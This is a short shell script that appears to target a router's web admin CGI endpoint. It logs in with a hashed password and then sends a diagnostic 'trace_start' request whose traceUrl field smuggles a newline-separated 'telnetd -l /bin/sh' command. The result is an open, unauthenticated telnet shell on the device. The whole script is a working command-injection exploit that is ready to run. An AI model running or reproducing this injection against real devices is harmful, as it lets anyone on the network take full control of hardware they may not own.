#!/bin/sh

read -p 'Username: ' USERNAME
read -sp 'Password: ' PASSWORD


echo

PASSWORD_HASH=$(printf ${PASSWORD} | md5sum | awk '{print $1}')
SESSION_ID=$(echo $RANDOM | md5sum | awk '{print $1}')
unset PASSWORD

echo

echo "Logging in..."
curl -s 'http://192.168.254.254/cgi-bin/lua.cgi' \
  -H 'Content-Type: application/json; charset=UTF-8' \
  --data-raw "{\"cmd\":100,\"method\":\"POST\",\"sessionId\":\"${SESSION_ID}\",\"username\":\"${USERNAME}\",\"passwd\":\"${PASSWORD_HASH}\"}" \
  > tmp/session.json

cat tmp/session.json
SESSION_ID=$(jq -r '.sessionId' tmp/session.json)
rm -rf tmp/session.json

echo
echo "Enabling Telnet..."
curl 'http://192.168.254.254/cgi-bin/lua.cgi' \
  -H 'Content-Type: application/json; charset=UTF-8' \
  --data-raw "{\"method\":\"POST\",\"cmd\":145,\"tool\":\"trace_start\",\"tracePort\":\"\",\"traceUrl\":\"127.0.0.1\ntelnetd -l /bin/sh\",\"sessionId\":\"${SESSION_ID}\"}"

